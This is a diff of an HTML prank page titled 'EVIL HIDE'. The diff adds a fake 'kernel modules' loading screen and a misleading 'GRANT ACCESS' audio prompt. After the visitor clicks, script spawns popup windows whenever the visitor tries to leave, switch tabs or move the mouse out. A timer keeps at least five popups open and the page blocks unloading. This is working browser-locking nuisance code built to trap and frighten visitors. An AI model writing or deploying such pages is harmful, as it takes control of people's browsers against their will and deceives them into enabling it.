@@ -1,9 +1,25 @@
-<html><head><base href="/">
+<!DOCTYPE html>
+<html>
+<head>
+  <base href="/">
   <title>EVIL HIDE</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <style>
+    :root {
+      --main-color: #ff0000;
+      --accent-color-1: #ff00ff;
+      --accent-color-2: #00ffff;
+      --bg-color: #000000;
+      --text-color: #ffffff;
+      --dark-bg: #1a1a1a;
+      --darker-bg: #101010;
+    }
+
     body {
-      background: #000000;
-      color: #ff0000;
+      background: var(--bg-color);
+      color: var(--main-color);
       margin: 0;
       padding: 0;
       overflow: hidden;
@@ -11,20 +27,84 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      font-family: 'Arial Black', sans-serif;
+      font-family: 'Share Tech Mono', monospace;
     }
 
-    .floating-text {
-      font-size: 4em;
-      color: #ff0000;
-      text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-      animation: float 2s ease-in-out infinite;
+    #matrix-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
     }
 
-    @keyframes float {
-      0% { transform: translateY(0px); }
-      50% { transform: translateY(-20px); }
-      100% { transform: translateY(0px); }
+    #main-content {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    #main-title {
+      font-size: 5em;
+      color: var(--main-color);
+      text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
+      position: relative;
+      animation: main-glitch 7s infinite linear;
+      letter-spacing: 0.1em;
+    }
+
+    #main-title::before,
+    #main-title::after {
+      content: 'EVIL HIDE </3';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--bg-color);
+      overflow: hidden;
+    }
+
+    #main-title::before {
+      left: 3px;
+      text-shadow: -3px 0 var(--accent-color-1);
+      animation: glitch-1 2s infinite linear alternate-reverse;
+    }
+
+    #main-title::after {
+      left: -3px;
+      text-shadow: -3px 0 var(--accent-color-2);
+      animation: glitch-2 2.5s infinite linear alternate-reverse;
+    }
+
+    @keyframes main-glitch {
+      0% { transform: skewX(0); }
+      5% { transform: skewX(0.5deg); }
+      10% { transform: skewX(0); }
+      50% { transform: skewX(0); }
+      55% { transform: skewX(-1deg); }
+      60% { transform: skewX(0); }
+      100% { transform: skewX(0); }
+    }
+
+    @keyframes glitch-1 {
+      0% { clip-path: polygon(0 2%, 100% 2%, 100% 5%, 0 5%); }
+      20% { clip-path: polygon(0 45%, 100% 45%, 100% 50%, 0 50%); }
+      40% { clip-path: polygon(0 90%, 100% 90%, 100% 92%, 0 92%); }
+      60% { clip-path: polygon(0 30%, 100% 30%, 100% 33%, 0 33%); }
+      80% { clip-path: polygon(0 65%, 100% 65%, 100% 70%, 0 70%); }
+      100% { clip-path: polygon(0 22%, 100% 22%, 100% 25%, 0 25%); }
+    }
+
+    @keyframes glitch-2 {
+      0% { clip-path: polygon(0 55%, 100% 55%, 100% 60%, 0 60%); }
+      15% { clip-path: polygon(0 10%, 100% 10%, 100% 15%, 0 15%); }
+      35% { clip-path: polygon(0 80%, 100% 80%, 100% 82%, 0 82%); }
+      55% { clip-path: polygon(0 40%, 100% 40%, 100% 43%, 0 43%); }
+      75% { clip-path: polygon(0 72%, 100% 72%, 100% 77%, 0 77%); }
+      100% { clip-path: polygon(0 33%, 100% 33%, 100% 35%, 0 35%); }
     }
 
     #modern-loading {
@@ -33,76 +113,64 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: #1a1a1a;
+      background: var(--darker-bg);
       display: flex;
       justify-content: center;
       align-items: center;
       z-index: 1000;
-    }
-
-    .loading-content {
-      text-align: center;
+      flex-direction: column;
     }
 
     .evil-text {
-      font-family: 'Arial Black', sans-serif;
+      font-family: 'Share Tech Mono', monospace;
       font-size: 4em;
-      color: #ff0000;
+      color: var(--main-color);
       margin-bottom: 40px;
       text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-      animation: pulse 2s infinite;
+      animation: pulse 1.5s infinite;
     }
-
+    
     .loader {
       width: 300px;
-      margin: 0 auto;
     }
 
     .progress-bar {
       width: 100%;
-      height: 4px;
+      height: 2px;
       background: #333;
-      border-radius: 2px;
+      border: 1px solid var(--main-color);
       overflow: hidden;
+      padding: 2px;
     }
 
     .progress {
       width: 0%;
       height: 100%;
-      background: #ff0000;
-      transition: width 0.5s ease;
+      background: var(--main-color);
+      box-shadow: 0 0 10px var(--main-color);
+      transition: width 0.1s linear;
     }
 
     .loading-text {
-      color: #ffffff;
-      font-family: 'Arial', sans-serif;
-      margin-top: 10px;
+      color: var(--text-color);
+      font-family: 'Share Tech Mono', monospace;
+      margin-top: 20px;
       font-size: 1.2em;
     }
 
-    .dots {
-      animation: loadingDots 1.5s infinite;
-    }
-
     @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
+      0% { opacity: 0.8; }
+      50% { opacity: 1; }
+      100% { opacity: 0.8; }
     }
 
-    @keyframes loadingDots {
-      0% { opacity: .2; }
-      20% { opacity: 1; }
-      100% { opacity: .2; }
-    }
-
-    .permission-overlay {
+    #permission-overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: #1a1a1a;
+      background: rgba(0, 0, 0, 0.8);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -111,52 +179,125 @@
 
     .permission-content {
       text-align: center;
-      color: #ffffff;
-      font-family: 'Arial', sans-serif;
-      padding: 20px;
-      background: #2a2a2a;
-      border-radius: 10px;
+      color: var(--text-color);
+      font-family: 'Share Tech Mono', monospace;
+      padding: 40px;
+      background: var(--darker-bg);
+      border: 1px solid var(--main-color);
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+      width: 500px;
     }
 
     .permission-content h2 {
-      margin-bottom: 20px;
+      margin-top: 0;
+      color: var(--main-color);
+    }
+    .permission-content p {
+      font-size: 1.1em;
+      margin-bottom: 30px;
     }
 
     #allow-button {
-      padding: 10px 20px;
+      padding: 15px 30px;
       font-size: 1.2em;
-      background: #ff0000;
-      color: white;
-      border: none;
-      border-radius: 5px;
+      font-family: 'Share Tech Mono', monospace;
+      background: var(--main-color);
+      color: var(--text-color);
+      border: 1px solid var(--main-color);
       cursor: pointer;
-      transition: background 0.3s;
+      transition: background 0.3s, color 0.3s, box-shadow 0.3s;
     }
 
     #allow-button:hover {
-      background: #cc0000;
+      background: var(--bg-color);
+      color: var(--main-color);
+      box-shadow: 0 0 15px var(--main-color);
     }
+     #allow-button:disabled {
+      cursor: wait;
+      opacity: 0.5;
+     }
   </style>
 </head>
 <body>
-  <div class="floating-text">EVIL HIDE </3 </div>
+  <canvas id="matrix-canvas"></canvas>
 
-  <audio id="bgMusic" loop>
-    <source src="https://files.catbox.moe/63a63h.mp3" type="audio/mpeg">
-  </audio>
+  <div id="modern-loading">
+    <div class="evil-text">INITIATING</div>
+    <div class="loader">
+      <div class="progress-bar">
+        <div class="progress" id="progress-fill"></div>
+      </div>
+      <div class="loading-text" id="loading-status">Loading kernel modules...</div>
+    </div>
+  </div>
+
+  <div id="permission-overlay" style="display: none;">
+    <div class="permission-content">
+      <h2>// ACCESS REQUIRED //</h2>
+      <p>This experience requires audio context permission to initialize the sonic environment. Granting access is irreversible.</p>
+      <button id="allow-button" disabled>AWAITING ASSETS...</button>
+    </div>
+  </div>
+  
+  <main id="main-content" style="display: none;">
+      <h1 id="main-title">EVIL HIDE &lt;/3</h1>
+  </main>
 
   <script>
     let windows = [];
+    let audioContext;
+    let bgMusicSource;
+    let windowOpenSfxBuffer;
 
+    const ASSET_URLS = {
+        bgMusic: './background_music.mp3',
+        windowOpenSfx: './window_open.mp3',
+    };
+
+    // --- Audio Functions ---
+    async function setupAudio() {
+        if (!audioContext) {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        }
+        windowOpenSfxBuffer = await fetch(ASSET_URLS.windowOpenSfx)
+            .then(res => res.arrayBuffer())
+            .then(buffer => audioContext.decodeAudioData(buffer));
+    }
+
+    function playSound(buffer, loop = false) {
+        if (!audioContext) return;
+        const source = audioContext.createBufferSource();
+        source.buffer = buffer;
+        source.connect(audioContext.destination);
+        source.loop = loop;
+        source.start(0);
+        return source;
+    }
+
+    async function playBgMusic() {
+        if (!audioContext) return;
+        if (bgMusicSource) bgMusicSource.stop();
+        
+        const response = await fetch(ASSET_URLS.bgMusic);
+        const arrayBuffer = await response.arrayBuffer();
+        const audioBuffer = await audioContext.decodeAudioData(arrayBuffer);
+
+        bgMusicSource = playSound(audioBuffer, true);
+    }
+
+
+    // --- Window Spawning Logic ---
     function createNewWindow() {
-      for(let i = 0; i < 3; i++) {
-        const width = 800;
-        const height = 600;
+      playSound(windowOpenSfxBuffer);
+      for(let i = 0; i < 2; i++) {
+        const width = Math.max(400, Math.round(Math.random() * 800));
+        const height = Math.max(300, Math.round(Math.random() * 600));
         const left = Math.round(Math.random() * (screen.width - width));
         const top = Math.round(Math.random() * (screen.height - height));
         
         const win = window.open(
-          window.location.href,
+          window.location.href.split('?')[0] + '?spawned=true',
           '',
           `width=${width},height=${height},left=${left},top=${top}`
         );
@@ -170,37 +311,135 @@
       }
     }
 
-    window.onbeforeunload = (e) => {
-      createNewWindow();
-      
-      e.preventDefault();
-      e.returnValue = '';
-      return '';
-    };
+    function startTraps() {
+        window.onbeforeunload = (e) => {
+          createNewWindow();
+          e.preventDefault();
+          e.returnValue = '';
+          return '';
+        };
 
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden) {
-        createNewWindow();
-      }
-    });
+        document.addEventListener('visibilitychange', () => {
+          if (document.hidden) createNewWindow();
+        });
 
-    document.addEventListener('mouseleave', () => {
-      createNewWindow();
-    });
+        document.addEventListener('mouseleave', createNewWindow);
 
-    setInterval(() => {
-      windows = windows.filter(w => !w.closed);
-      if(windows.length < 5) {
-        createNewWindow();
-      }
-    }, 1000);
+        setInterval(() => {
+          windows = windows.filter(w => !w.closed);
+          if(windows.length < 5) {
+            createNewWindow();
+          }
+        }, 3000);
+    }
 
+    // --- Experience Flow ---
+    function startExperience() {
+        document.getElementById('permission-overlay').style.display = 'none';
+        document.getElementById('main-content').style.display = 'flex';
+        playBgMusic();
+        startTraps();
+        setTimeout(createNewWindow, 2000);
+    }
+    
+    function showPermissionPrompt() {
+        const overlay = document.getElementById('permission-overlay');
+        const button = document.getElementById('allow-button');
+        overlay.style.display = 'flex';
+
+        setupAudio().then(() => {
+            button.disabled = false;
+            button.textContent = 'GRANT ACCESS';
+            button.onclick = () => {
+                if(audioContext.state === 'suspended') {
+                    audioContext.resume();
+                }
+                startExperience();
+            };
+        });
+    }
+
+    function runLoadingScreen() {
+        const progressFill = document.getElementById('progress-fill');
+        const loadingStatus = document.getElementById('loading-status');
+        let width = 0;
+        const loadingStates = [
+            'Loading kernel modules...', 'Decrypting filesystem...', 'Mounting virtual drives...', 'Initializing core process...', 'Bypassing security protocols...', 'Establishing connection...', 'Ready.'
+        ];
+        let stateIndex = 0;
+
+        const interval = setInterval(() => {
+            width += Math.random() * 5;
+            if (width >= (stateIndex + 1) * (100 / loadingStates.length)) {
+                loadingStatus.textContent = loadingStates[stateIndex];
+                stateIndex++;
+            }
+            if (width >= 100) {
+                width = 100;
+                progressFill.style.width = width + '%';
+                loadingStatus.textContent = loadingStates[loadingStates.length - 1];
+                clearInterval(interval);
+                setTimeout(() => {
+                    document.getElementById('modern-loading').style.display = 'none';
+                    showPermissionPrompt();
+                }, 500);
+            }
+            progressFill.style.width = width + '%';
+        }, 100);
+    }
+
+    // --- Canvas Background ---
+    function drawMatrix() {
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const characters = '01';
+        const font_size = 14;
+        const columns = canvas.width / font_size;
+        const drops = [];
+
+        for (let x = 0; x < columns; x++) drops[x] = 1;
+
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#ff0000';
+            ctx.font = font_size + 'px Share Tech Mono';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = characters.charAt(Math.floor(Math.random() * characters.length));
+                ctx.fillText(text, i * font_size, drops[i] * font_size);
+                if (drops[i] * font_size > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 40);
+    }
+
+    // --- Main Initializer ---
     document.addEventListener('DOMContentLoaded', () => {
-      const audio = document.getElementById('bgMusic');
-      audio.play().catch(e => console.log('Audio autoplay blocked'));
-      
-      createNewWindow();
+        drawMatrix();
+        const urlParams = new URLSearchParams(window.location.search);
+        const isSpawned = urlParams.get('spawned');
+
+        if (isSpawned) {
+            document.getElementById('modern-loading').style.display = 'none';
+            document.getElementById('permission-overlay').style.display = 'none';
+            document.getElementById('main-content').style.display = 'flex';
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            setupAudio();
+            startTraps();
+        } else {
+            runLoadingScreen();
+        }
     });
   </script>
 </body>
 </html>
+
